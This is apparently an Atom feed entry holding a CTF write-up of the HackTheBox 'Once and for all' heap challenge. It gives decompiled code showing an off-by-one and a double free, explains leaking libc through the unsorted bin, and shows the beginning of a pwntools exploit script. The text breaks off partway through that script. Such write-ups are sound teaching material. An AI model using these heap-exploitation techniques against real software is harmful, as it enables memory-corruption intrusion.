<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[HackTheBox on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/HackTheBox/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/HackTheBox/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2022-07-18T22:45:46+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/HackTheBox/</id>
        
        <entry>
            <title type="html"><![CDATA[[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all]]></title>
            <link href="https://nasm.re/posts/onceforall/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/onceforall/</id>
            
            <published>2022-05-19T00:00:00+00:00</published>
            <updated>2022-05-19T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
Find the tasks and the final exploit <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/"
  
  >here</a
> and <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="reverse-engineering">
        Reverse engineering
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#reverse-engineering" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reverse engineering" href="#reverse-engineering">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>All the snippets of pseudo-code are issued by <a
  class="gblog-markdown__link"
  href="https://hex-rays.com/ida-free/"
  
  >IDA freeware</a
>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">49</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_1310</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_13C8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="n">small_alloc</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
        <span class="n">fix</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
        <span class="n">examine</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
        <span class="n">savebig</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="k">default</span><span class="o">:</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid choice!&#34;</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The binary allows you to allocate a small chunk beetween <code>0x1f</code> and <code>0x38</code> bytes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">small_alloc</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">nmemb</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">idx</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [rsp+8h] [rbp-18h] BYREF
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">allocated</span> <span class="o">==</span> <span class="mi">15</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Nothing more!&#34;</span><span class="p">);</span>
  <span class="o">++</span><span class="n">allocated</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Choose an index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">||</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">||</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xEuLL</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">How much space do you need for it: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nmemb</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">nmemb</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span> <span class="o">||</span> <span class="n">nmemb</span> <span class="o">&gt;</span> <span class="mh">0x38</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Your inventory cannot provide this type of space!&#34;</span><span class="p">);</span>
  <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">nmemb</span><span class="p">;</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">nmemb</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Something didn&#39;t work out...&#34;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input your weapon&#39;s details: &#34;</span><span class="p">);</span>
  
  <span class="cp"># off-by-one
</span><span class="cp"></span>  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]],</span> <span class="n">nmemb</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.</p>
<p>The fix function frees a chunk and asks for another size, then it allocates another chunk with <code>calloc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">fix</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
</span><span class="c1"></span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Choose an index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0xE</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ok, let&#39;s get you some new parts for this one... seems like it&#39;s broken&#34;</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">How much space do you need for this repair: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x38</span> <span class="p">)</span>
    <span class="cp"># [1] 
</span><span class="cp"></span>    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Your inventory cannot provide this type of space.&#34;</span><span class="p">);</span>
  <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
  <span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Something didn&#39;t work out...&#34;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input your weapon&#39;s details: &#34;</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What would you like to do now?</span><span class="se">\n</span><span class="s">1. Verify weapon</span><span class="se">\n</span><span class="s">2. Continue</span><span class="se">\n</span><span class="s">&gt;&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">verified</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_1648</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]);</span>
      <span class="n">verified</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>If we reach <code>[1]</code>, <code>alloc_array[2 * idx]</code> is freed leading to a double free.</p>
<p>We can print a chunk only one time:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">examine</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h] BYREF
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">examined</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_14D0</span><span class="p">);</span>
  <span class="n">examined</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Choose an index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xE</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]);</span>
  <span class="k">else</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Finally we can malloc a huge chunk, but we cannot wriet anything within:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">savebig</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h] BYREF
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">chungus_weapon</span> <span class="o">||</span> <span class="n">qword_202068</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_16E8</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;How much space do you need for this massive weapon: &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x5AFu</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0xF5C0u</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Adding to your inventory..&#34;</span><span class="p">);</span>
      <span class="n">chungus_weapon</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
      <span class="n">v0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
      <span class="n">qword_202068</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] This is not possible..&#34;</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<div class="gblog-post__anchorwrap">
    <h2 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>An off-by-one when we create a new chunk</li>
<li>Double free by calling <code>fix</code> and then providing an invalid size.</li>
<li>Trivial read after free thanks to the double free.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="restrictions">
        Restrictions
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#restrictions" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Restrictions" href="#restrictions">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>The program does not use <code>printf</code> with a format specifer, then we cannot do a <a
  class="gblog-markdown__link"
  href="https://maxwelldulin.com/BlogPost?post=3107454976"
  
  >House of husk</a
>.</li>
<li>We can only allocate <code>15</code> chunks.</li>
<li>All the allocations except the big one are made using <code>calloc</code>, even if it can be easily bypassed by adding the <code>IS_MAPPED</code> flag to the chunk header to avoid zero-ing.</li>
<li>The libc version (<code>2.27</code>) mitigates a few techniques, especially the <a
  class="gblog-markdown__link"
  href="https://1ce0ear.github.io/2017/11/26/study-house-of-orange/"
  
  >House of Orange</a
> and introduces the <code>tcache</code>.</li>
<li>Allocations have to fit in only two fastbins (<code>0x30</code> / <code>0x40</code>), which means we cannot get an arbitrary with a <code>fastbin dup</code> technique due to the size of most of interesting memory areas in the libc (<code>0x7f</code> =&gt; <code>0x70</code> fastbin against <code>0x30</code> / <code>0x40</code> in our case).</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="how-to-leak-libc-">
        How to leak libc ?
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#how-to-leak-libc-" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor How to leak libc ?" href="#how-to-leak-libc-">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&rsquo;s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for it: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">hang</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input your weapon&#39;s details: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">freexalloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for this repair: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">if</span> <span class="n">doubleFree</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input your weapon&#39;s details: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">allochuge</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for this massive weapon: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="c1"># get libc leak</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">55</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">39</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mi">39</span><span class="p">)</span> <span class="c1"># size</span>
<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;D&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x10</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;E&#34;</span><span class="o">*</span><span class="mi">39</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span> <span class="c1"># barrier</span>

<span class="c1"># freexalloc(5, 560, b&#34;&#34;, doubleFree=True)</span>

